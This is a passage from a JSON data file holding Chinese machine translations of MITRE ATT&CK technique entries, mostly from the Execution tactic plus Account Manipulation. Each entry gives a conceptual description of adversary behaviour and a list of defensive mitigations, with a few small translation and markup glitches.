                            "type": "text",
                            "content": "组，并使用"
                        },
                        {
                            "type": "code",
                            "content": "RoleBindings"
                        },
                        {
                            "type": "text",
                            "content": "而不是<code>ClusterRoleBindings[/code>将用户权限限制在特定名称空间。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1610",
        "name": "Deploy Container",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会将容器部署到环境中，以便于执行或躲避防御。在某些情况下，对手可能会部署新的容器来执行与特定映像或部署相关联的进程，例如执行或下载恶意软件的进程。在其他情况下，对手可以部署新的容器，该容器在没有网络规则、用户限制等的情况下配置，以绕过环境中的现有防御。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "容器可以通过各种方式进行部署，例如通过Docker的"
                },
                {
                    "type": "code",
                    "content": "create"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "start"
                },
                {
                    "type": "text",
                    "content": "API，或者通过web应用程序（如Kubernetes仪表板或Kubeflow）进行部署。敌人可以基于检索到的或构建的恶意映像或从运行时下载并执行恶意有效载荷的良性映像部署容器。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在部署之前扫描图像，并阻止那些不符合安全策略的图像。在Kubernetes环境中，准入控制器可以用于在容器部署请求经过身份验证之后但在部署容器之前验证映像。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将与容器服务的通信限制在受管理和安全的通道上，例如本地Unix套接字或通过SSH进行远程访问。通过禁用对Docker API、Kubernetes API服务器和容器编排web应用程序的未经身份验证的访问，要求安全端口访问以通过TLS与API通信。在部署在云环境中的Kubernetes集群中，使用本地云平台功能来限制允许访问API服务器的IP范围。在可能的情况下，考虑启用对Kubernetes API的实时（JIT）访问，以对访问施加额外的限制。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝通过使用网络代理、网关和防火墙直接远程访问内部系统。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过将容器控制面板的访问权限限制为仅必要的用户，强制执行最小权限原则。使用Kubernetes时，请避免向用户授予通配符权限或将用户添加到"
                        },
                        {
                            "type": "code",
                            "content": "system:masters"
                        },
                        {
                            "type": "text",
                            "content": "组，并使用"
                        },
                        {
                            "type": "code",
                            "content": "RoleBindings"
                        },
                        {
                            "type": "text",
                            "content": "而不是<code>ClusterRoleBindings[/code>将用户权限限制在特定名称空间。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1203",
        "name": "Exploitation for Client Execution",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会利用客户端应用程序中的软件漏洞来执行代码。由于不安全的编码实践，软件中可能存在漏洞，从而导致意外行为。敌人可以通过有针对性的利用某些漏洞来执行任意代码。通常，对攻击性工具包最有价值的利用是那些可以用来在远程系统上获得代码执行的漏洞，因为它们可以用来访问该系统。用户希望看到与他们通常用于工作的应用程序相关的文件，因此，由于它们的高实用性，它们是利用研究和开发的有用目标。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "存在几种类型："
                }
            ],
            [
                {
                    "type": "text",
                    "content": "网络浏览器是“妥协驱动”和“钓鱼钓鱼链接”的常见目标。端点系统可能会通过正常的网络浏览或某些用户被鱼叉式网络钓鱼电子邮件中的链接攻击到用于利用网络浏览器的对手控制的网站而受到损害。这些攻击通常不需要用户执行操作即可执行。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "常见的办公和生产力应用程序（如Microsoft office）也成为网络钓鱼的目标。恶意文件将直接作为附件或通过链接下载。这需要用户打开文档或文件，以便运行该漏洞。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "常见的或作为部署在目标网络中的软件的一部分的其他应用程序也可以用于利用。Adobe Reader和Flash等在企业环境中很常见的应用程序，经常成为试图访问系统的对手的目标。根据软件和漏洞的性质，有些漏洞可能会在浏览器中被利用，或者要求用户打开文件。例如，一些Flash漏洞攻击已作为Microsoft Office文档中的对象提供。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "浏览器沙盒可以用来减轻利用的一些影响，但沙盒逃逸可能仍然存在。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "其他类型的虚拟化和应用程序细分也可以减轻客户端利用的影响。这些系统中可能仍然存在其他漏洞和弱点的风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "查找利用漏洞期间使用的行为的安全应用程序，如Windows Defender Exploit Guard（WDEG）和增强型缓解体验工具包（EMET），可用于缓解某些利用行为。控制流完整性检查是另一种可能识别和阻止软件利用的方法。其中许多保护取决于体系结构和目标应用程序二进制文件的兼容性。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1559",
        "name": "Inter-Process Communication",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [
            {
                "id": "T1559.001",
                "name": "Component Object Model"
            },
            {
                "id": "T1559.002",
                "name": "Dynamic Data Exchange"
            },
            {
                "id": "T1559.003",
                "name": "XPC Services"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会滥用进程间通信（IPC）机制来执行本地代码或命令。进程通常使用IPC来共享数据、相互通信或同步执行。IPC还通常用于避免死锁等情况，这种情况发生在进程陷入循环等待模式时。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用IPC来执行任意代码或命令。IPC机制可能因操作系统而异，但通常以可通过编程语言/库或本机接口（如Windows动态数据交换或组件对象模型）访问的形式存在。Linux环境支持几种不同的IPC机制，其中两种是套接字和管道。更高级别的执行介质，如命令和脚本解释器，也可以利用底层IPC机制。对手也可以使用远程服务，例如分布式组件对象模型来促进远程IPC的执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在开发应用程序时启用硬化运行时功能。不要包含"
                        },
                        {
                            "type": "code",
                            "content": "com.apple.security.get task-allow"
                        },
                        {
                            "type": "text",
                            "content": "权限，该权限的值设置为true的任何变体。"
                        }
                    ]
                ]
            },
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有COM警报和受保护视图都已启用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用“减少攻击面”（ASR）规则，以防止DDE攻击和Office程序生成子进程。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以将特定于Microsoft Office功能控制安全性的注册表项设置为禁用DDE/OLE自动执行。Microsoft还创建并默认启用注册表项，以完全禁用Word和Excel中的DDE执行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "修改"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}"
                        },
                        {
                            "type": "text",
                            "content": "中与单个COM应用程序的进程范围安全性相关的注册表设置（直接或使用Dcomcnfg.exe）。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "修改"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole"
                        },
                        {
                            "type": "text",
                            "content": "中的注册表设置（直接或使用Dcomcnfg.exe），这些设置与所有不设置自己的进程范围安全性的COM应用程序的系统范围安全默认值相关联。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑禁用Office程序（如OneNote）中不适用于受保护视图的嵌入文件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1106",
        "name": "Native API",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以与本机OS应用程序编程接口（API）交互以执行行为。本机API提供了一种可控的方式来调用内核内的低级操作系统服务，例如涉及硬件/设备、内存和进程的服务。操作系统在系统引导期间（当其他系统组件尚未初始化时）以及在例行操作期间执行任务和请求时，会利用这些本机API。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用这些操作系统API函数作为执行行为的手段。与命令和脚本解释器类似，本机API及其接口层次结构提供了与受害系统的各种组件交互并利用这些组件的机制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "本机API函数（如"
                },
                {
                    "type": "code",
                    "content": "NtCreateProcess"
                },
                {
                    "type": "text",
                    "content": "）可以通过系统调用/系统调用直接调用，但这些功能也经常通过接口和库暴露给用户模式应用程序。例如，Windows API"
                },
                {
                    "type": "code",
                    "content": "CreateProcess（）"
                },
                {
                    "type": "text",
                    "content": "或GNU"
                },
                {
                    "type": "code",
                    "content": "fork（）"
                },
                {
                    "type": "text",
                    "content": "等函数将允许程序和脚本启动其他进程。这可以允许API调用方执行二进制文件、运行CLI命令、加载模块等，因为存在用于各种系统操作的数千个类似的API函数。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "更高级别的软件框架，如Microsoft。NET和macOS Cocoa也可用于与本机API交互。这些框架通常为API功能提供语言包装器/抽象，并为代码的易用性/可移植性而设计。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以使用汇编直接或直接调用系统调用，试图破坏防御传感器和检测签名，如用户模式API-hooks。敌人还可能试图篡改与API监控相关的传感器和防御工具，例如通过禁用或修改工具解除监控功能。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则以防止Office VBA宏调用Win32 API。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用应用程序控制工具，如Windows Defender应用程序控制、AppLocker或软件限制策略（如适用），识别并阻止可能通过此技术执行的潜在恶意软件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1053",
        "name": "Scheduled Task/Job",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1053.002",
                "name": "At"
            },
            {
                "id": "T1053.003",
                "name": "Cron"
            },
            {
                "id": "T1053.005",
                "name": "Scheduled Task"
            },
            {
                "id": "T1053.006",
                "name": "Systemd Timers"
            },
            {
                "id": "T1053.007",
                "name": "Container Orchestration Job"
            }
        ],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能滥用任务调度功能来促进恶意代码的初始或重复执行。所有主要操作系统中都存在实用程序，用于安排程序或脚本在指定的日期和时间执行。如果满足正确的身份验证（例如：Windows环境中的RPC以及文件和打印机共享），也可以在远程系统上调度任务。在远程系统上调度任务通常可能需要成为远程系统上的管理员或其他特权组的成员。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以在系统启动时使用任务调度来执行程序，或者在计划的基础上执行程序以实现持久性。这些机制也可能被滥用以在指定帐户（例如具有提升权限/特权的帐户）的上下文下运行进程。与系统二进制代理执行类似，对手也滥用任务调度来潜在地掩盖可信系统进程下的一次性执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "PowerSploit框架等工具包包含PowerUp模块，这些模块可用于探索系统中可用于提升权限的计划任务中的权限弱点。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置计划任务的设置，以强制任务在经过身份验证的帐户的上下文下运行，而不允许它们作为SYSTEM运行。相关的注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl"
                        },
                        {
                            "type": "text",
                            "content": "。可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>安全选项来配置该设置：域控制器：允许服务器操作员计划任务，设置为禁用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将“增加计划优先级”选项配置为仅允许管理员组具有计划优先级进程的权限。这可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配进行配置：增加计划优先级。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户的权限并修正权限提升向量，以便只有经过授权的管理员才能在远程系统上创建计划任务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1648",
        "name": "Serverless Execution",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用无服务器计算、集成和自动化服务在云环境中执行任意代码。许多云提供商提供各种无服务器资源，包括计算引擎、应用程序集成服务和web服务器。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会以各种方式滥用这些资源，作为执行任意命令的手段。例如，对手可能使用无服务器功能来执行恶意代码，例如加密挖掘恶意软件（即资源劫持）。对手还可能创建功能，从而进一步损害云环境。例如，对手可以使用AWS中的"
                },
                {
                    "type": "code",
                    "content": "IAM：PassRole"
                },
                {
                    "type": "text",
                    "content": "权限或谷歌云中的"
                },
                {
                    "type": "code",
                    "content": "IAM.serviceAccounts.actAs"
                },
                {
                    "type": "text",
                    "content": "许可，将其他云角色添加到无服务器云功能中，从而可以执行原始用户无法执行的操作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "也可以调用无服务器功能来响应云事件（即事件触发执行），从而可能随着时间的推移实现持久执行。例如，在AWS环境中，对手可能会创建一个Lambda函数，该函数会自动向用户添加额外的云凭据，以及相应的CloudWatch事件规则，该规则会在创建新用户时调用该函数。同样，对手可能会在Office 365环境中创建Power Automate工作流，该工作流转发用户收到的所有电子邮件，或在授予用户访问SharePoint中文档的权限时创建匿名共享链接。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "从没有明确要求的用户中删除创建、修改或运行无服务器资源的权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1129",
        "name": "Shared Modules",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能通过加载共享模块来执行恶意有效载荷。共享模块是加载到进程中以提供对可重用代码的访问的可执行文件，例如特定的自定义函数或调用OS API函数（即Native API）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以使用此功能在受害者系统上执行任意有效载荷。例如，对手可以将其恶意软件的功能模块化为执行各种功能的共享对象，例如管理C2网络通信或执行目标上的特定动作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "Linux和macOS模块加载程序可以从任意本地路径加载和执行共享对象。此功能存在于"
                },
                {
                    "type": "code",
                    "content": "dlfcn.h"
                },
                {
                    "type": "text",
                    "content": "中的函数中，如"
                },
                {
                    "type": "code",
                    "content": "dlopen"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "dlsym"
                },
                {
                    "type": "text",
                    "content": "。尽管macOS可以执行＜code＞.so＜/code＞文件，但通常的做法是使用＜code＞.dylib＜/code〕文件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以指示Windows模块加载程序从任意本地路径和任意通用命名约定（UNC）网络路径加载DLL。此功能驻留在"
                },
                {
                    "type": "code",
                    "content": "NTDLL.dll"
                },
                {
                    "type": "text",
                    "content": "中，是Windows Native API的一部分，该API在运行时从"
                },
                {
                    "type": "code",
                    "content": "LoadLibrary"
                },
                {
                    "type": "text",
                    "content": "等函数调用。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用能够防止加载未知模块的应用程序控制工具，识别并阻止通过该技术执行的潜在恶意软件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1072",
        "name": "Software Deployment Tools",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            },
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以访问并使用安装在企业网络中的第三方软件套件，如管理、监控和部署系统，在网络中横向移动。第三方应用程序和软件部署系统可以在网络环境中用于管理目的（例如，SCCM、HBSS、Altiris等）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对第三方网络范围或企业范围软件系统的访问可以使对手能够在连接到这样的系统的所有系统上进行远程代码执行。访问可以用于横向移动到其他系统、收集信息或造成特定影响，例如擦除所有端点上的硬盘驱动器。网络基础设施也可能具有同样可能被对手滥用的管理工具。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "此操作所需的权限因系统配置而异；本地凭证可能足以直接访问第三方系统，或者可能需要特定的域凭证。但是，系统可能需要管理帐户才能登录或执行其预期目的。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用组策略确保关键网络系统的正确系统和访问隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1033",
                "name": "限制软件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制使用安装在企业网络中的第三方软件套件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用多因素身份验证，确保关键网络系统的正确系统和访问隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用防火墙确保关键网络系统的适当系统隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "验证可用于访问部署系统的帐户凭据是唯一的，并且未在整个企业网络中使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "仅向数量有限的授权管理员授予对应用程序部署系统的访问权限。"
                        }
                    ]
                ]
            },
            {
                "id": "M1029",
                "name": "远程数据存储",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果应用程序部署系统可以配置为仅部署已签名的二进制文件，请确保受信任的签名证书不与应用程序部署体系位于同一位置，而是位于无法远程访问或远程访问受到严格控制的系统上。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期对部署系统进行修补，以防止通过特权升级漏洞进行潜在的远程访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保第三方提供商用于访问这些系统的任何帐户都可以追溯到第三方，并且不会在整个网络中使用，也不会被同一环境中的其他第三方供应商使用。确保对提供给这些系统的帐户进行定期审查，以验证持续的业务需求，并确保有治理来跟踪不再需要的访问的取消提供。通过使用帐户权限分离，确保关键网络系统的正确系统和访问隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对部署系统的使用有严格的审批政策。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1569",
        "name": "System Services",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [
            {
                "id": "T1569.001",
                "name": "Launchctl"
            },
            {
                "id": "T1569.002",
                "name": "Service Execution"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用系统服务或守护程序来执行命令或程序。对手可以通过本地或远程与服务交互或创建服务来执行恶意内容。许多服务被设置为在启动时运行，这有助于实现持久性（创建或修改系统进程），但对手也可以滥用服务进行一次性或临时执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则以阻止PsExec创建的进程运行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保权限不允许以较高权限级别运行的服务由具有较低权限级别的用户创建或与其交互。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保具有较低权限级别的用户不能替换或修改高权限级别的服务二进制文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "阻止用户安装自己的启动代理程序或启动守护程序。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1204",
        "name": "User Execution",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [
            {
                "id": "T1204.001",
                "name": "Malicious Link"
            },
            {
                "id": "T1204.002",
                "name": "Malicious File"
            },
            {
                "id": "T1204.003",
                "name": "Malicious Image"
            }
        ],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以依靠用户的特定动作来获得执行。用户可能会受到社会工程的影响，例如通过打开恶意文档文件或链接来执行恶意代码。这些用户行为通常会被视为网络钓鱼形式的后续行为。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "虽然用户执行通常发生在初始访问后不久，但也可能发生在入侵的其他阶段，例如当对手将文件放置在共享目录或用户桌面上，希望用户点击它时。这种活动也可能在内部矛式网络钓鱼后不久出现。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手也可能欺骗用户执行操作，例如启用远程访问软件，允许对手直接控制系统，或下载和执行恶意软件以供用户执行。例如，技术支持诈骗可以通过网络钓鱼、视频聊天或各种形式的用户互动来提供便利。攻击者可以使用这些方法的组合，例如欺骗和推广用于将受害者引导到恶意网站的免费电话号码或呼叫中心，以交付和执行包含恶意软件或远程访问软件的有效载荷。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用“减少攻击面”（ASR）规则，以防止可执行文件运行，除非它们符合流行率、使用年限或受信任列表标准，并通过阻止恶意代码写入磁盘来防止Office应用程序创建潜在的恶意可执行内容。注意：必须启用云提供的保护才能使用某些规则。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序控制可能能够防止伪装成其他文件的可执行文件的运行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果用户正在访问链接，则可以使用网络入侵预防系统和设计用于扫描和删除恶意下载的系统来阻止活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果用户正在访问某个链接，则默认情况下，阻止传输中不应下载的未知或未使用的文件，或者根据策略阻止可疑网站下载这些文件，作为防止某些矢量的最佳做法，如.scr、.exe、.pif、.cpl等。一些下载扫描设备可以打开并分析压缩和加密格式，如zip和rar，这些格式可能用于隐藏恶意文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用用户培训来提高人们对常见网络钓鱼和鱼叉式网络钓鱼技术的认识，以及如何提高对潜在恶意事件的怀疑。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1047",
        "name": "Windows Management Instrumentation",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用Windows Management Instrumentation（WMI）来执行恶意命令和有效负载。WMI是一种管理功能，它提供了访问Windows系统组件的统一环境。WMI服务同时支持本地和远程访问，尽管后者由分布式组件对象模型（DCOM）和Windows远程管理（WinRM）等远程服务提供便利。DCOM上的远程WMI使用端口135进行操作，而WinRM上的WMI在使用HTTP和5986进行HTTPS时通过端口5985进行操作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用WMI与本地和远程系统进行交互，并将其用作执行各种行为的手段，例如为发现收集信息，以及作为横向移动的一部分远程执行文件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则以阻止WMI命令创建的进程运行。注意：许多合法的工具和应用程序使用WMI执行命令。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果给定系统或网络不需要执行"
                        },
                        {
                            "type": "code",
                            "content": "wmic.exe"
                        },
                        {
                            "type": "text",
                            "content": "，请使用配置为阻止其执行的应用程序控制，以防止对手滥用。例如，在Windows 10和Windows Server 2016及更高版本中，可以应用Windows Defender应用程序控制（WDAC）策略规则来阻止"
                        },
                        {
                            "type": "code",
                            "content": "wmic.exe"
                        },
                        {
                            "type": "text",
                            "content": "应用程序并防止滥用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防止管理员帐户和特权帐户系统之间的凭据重叠。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "默认情况下，只允许管理员使用WMI进行远程连接。限制允许连接的其他用户，或禁止所有用户远程连接到WMI。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1098",
        "name": "Account Manipulation",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1098.001",
                "name": "Additional Cloud Credentials"
            },
            {
                "id": "T1098.002",
                "name": "Additional Email Delegate Permissions"
            },
            {
                "id": "T1098.003",
                "name": "Additional Cloud Roles"
            },
            {
                "id": "T1098.004",
                "name": "SSH Authorized Keys"
            },
            {
                "id": "T1098.005",
                "name": "Device Registration"
            },
            {
                "id": "T1098.006",
                "name": "Additional Container Cluster Roles"
            }
        ],
        "version": "2.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会操纵账户以维护和/或提升对受害者系统的访问权限。账户操纵可能包括保留或修改对手对受损账户的访问权限的任何操作，例如修改凭据或权限组。这些操作还可能包括旨在颠覆安全策略的帐户活动，例如执行迭代密码更新以绕过密码持续时间策略并保留受损凭据的寿命。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "为了创建或操纵帐户，对手必须已经对系统或域拥有足够的权限。但是，帐户操作也可能导致权限升级，其中修改会授予对其他角色、权限或更高特权的有效帐户的访问权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对用户和特权帐户使用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置访问控制和防火墙以限制对关键系统和域控制器的访问。大多数云环境都支持独立的虚拟专用云（VPC）实例，从而实现云系统的进一步细分。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过确保关键服务器的正确安全配置来保护域控制器，以限制可能不必要的协议和服务（如SMB文件共享）的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不允许域管理员帐户用于日常操作，这可能会使它们暴露在非特权系统上的潜在对手面前。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保低特权用户帐户没有修改帐户或帐户相关策略的权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1197",
        "name": "BITS Jobs",
        "tactics": [
            {
